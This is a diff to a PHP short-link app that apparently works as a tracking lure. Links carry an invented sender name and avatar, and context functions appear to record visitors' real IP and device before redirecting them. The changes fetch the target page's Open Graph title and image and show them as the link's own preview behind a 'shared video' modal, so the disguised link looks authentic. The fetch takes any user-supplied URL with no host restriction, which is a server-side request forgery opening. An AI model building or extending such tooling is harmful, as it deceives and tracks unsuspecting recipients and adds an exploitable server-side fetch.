@@ -14,6 +14,8 @@ try {
         target_url TEXT, 
         sender_name TEXT,
         sender_avatar TEXT,
+        meta_title TEXT,
+        meta_image TEXT,
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )");
 
@@ -28,6 +30,37 @@ try {
     )");
 } catch (Exception $e) {
     die("Database error: " . $e->getMessage());
+}
+
+function fetch_real_meta($url) {
+    $title = "Shared Video";
+    $image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
+
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)');
+    $html = curl_exec($ch);
+    curl_close($ch);
+
+    if ($html) {
+        $dom = new DOMDocument();
+        @$dom->loadHTML(mb_convert_encoding($html, 'HTML-ENTITIES', 'UTF-8'));
+        $xpath = new DOMXPath($dom);
+
+        $titleNodes = $xpath->query('//meta[@property="og:title"]/@content | //meta[@name="twitter:title"]/@content');
+        if ($titleNodes->length > 0) {
+            $title = $titleNodes->item(0)->nodeValue;
+        }
+
+        $imageNodes = $xpath->query('//meta[@property="og:image"]/@content | //meta[@name="twitter:image"]/@content');
+        if ($imageNodes->length > 0) {
+            $image = $imageNodes->item(0)->nodeValue;
+        }
+    }
+    return ['title' => trim($title), 'image' => trim($image)];
 }
 
 function get_real_ip() {
@@ -53,6 +86,8 @@ function get_device_type($ua) {
     return 'Unknown Device';
 }
 
+$og_title = "Shared Video";
+$og_image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
 $target_redirect = "";
 $sender_name = "User";
 $sender_avatar = "https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?w=100&auto=format&fit=crop&q=60";
@@ -65,6 +100,8 @@ if (isset($_GET['r'])) {
 
     if ($link) {
         $target_redirect = $link['target_url'];
+        $og_title = $link['meta_title'];
+        $og_image = $link['meta_image'];
         $sender_name = $link['sender_name'];
         $sender_avatar = $link['sender_avatar'];
 
@@ -98,9 +135,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
         $target_url = "https://" . $target_url;
     }
 
+    $meta = fetch_real_meta($target_url);
     $code = substr(md5(uniqid(rand(), true)), 0, 7);
-    $stmt = $db->prepare("INSERT INTO links (code, target_url, sender_name, sender_avatar) VALUES (?, ?, ?, ?)");
-    $stmt->execute([$code, $target_url, $sender_name, $sender_avatar]);
+
+    $stmt = $db->prepare("INSERT INTO links (code, target_url, sender_name, sender_avatar, meta_title, meta_image) VALUES (?, ?, ?, ?, ?, ?)");
+    $stmt->execute([$code, $target_url, $sender_name, $sender_avatar, $meta['title'], $meta['image']]);
 
     $domain = $_SERVER['HTTP_HOST'];
     $generated_link = "https://" . $domain . "/?r=" . $code;
@@ -122,52 +161,37 @@ if (isset($_GET['r']) && !empty($target_redirect)):
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Watch Video</title>
+    <title><?php echo htmlspecialchars($og_title); ?></title>
+    <meta property="og:title" content="<?php echo htmlspecialchars($og_title); ?>">
+    <meta property="og:image" content="<?php echo htmlspecialchars($og_image); ?>">
+    <meta property="og:type" content="website">
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
         body, html { width: 100%; height: 100%; overflow: hidden; background: #000; display: flex; justify-content: center; align-items: center; position: relative; }
         
-        .tiktok-bg {
+        /* خلفية مشابهة للصورة (صورة الفيديو الأساسية مع تأثير البلور والتغبيش) */
+        .blurred-bg {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: linear-gradient(135deg, #121212 0%, #1f1f1f 50%, #0a0a0a 100%);
+            background: url('<?php echo htmlspecialchars($og_image); ?>') no-repeat center center/cover;
+            filter: blur(18px) brightness(0.7);
+            transform: scale(1.1);
             z-index: 1;
         }
-        .tiktok-bg::before {
-            content: '';
-            position: absolute;
-            width: 300px;
-            height: 300px;
-            background: rgba(254, 44, 85, 0.15);
-            border-radius: 50%;
-            top: 10%;
-            left: 10%;
-            filter: blur(80px);
-        }
-        .tiktok-bg::after {
-            content: '';
-            position: absolute;
-            width: 300px;
-            height: 300px;
-            background: rgba(37, 244, 238, 0.15);
-            border-radius: 50%;
-            bottom: 10%;
-            right: 10%;
-            filter: blur(80px);
-        }
 
+        /* نافذة العرض المركزية */
         .modal-card {
             position: relative;
-            background: #ffffff;
+            background: rgba(255, 255, 255, 0.98);
             width: 90%;
             max-width: 350px;
             border-radius: 24px;
             padding: 30px 20px;
             text-align: center;
-            box-shadow: 0 25px 50px rgba(0,0,0,0.6);
+            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
             z-index: 10;
             animation: popUp 0.3s ease-out;
         }
@@ -246,7 +270,7 @@ if (isset($_GET['r']) && !empty($target_redirect)):
     </script>
 </head>
 <body>
-    <div class="tiktok-bg"></div>
+    <div class="blurred-bg"></div>
     <div class="modal-card">
         <div class="avatar-container">
             <img src="<?php echo htmlspecialchars($sender_avatar); ?>" alt="Avatar">
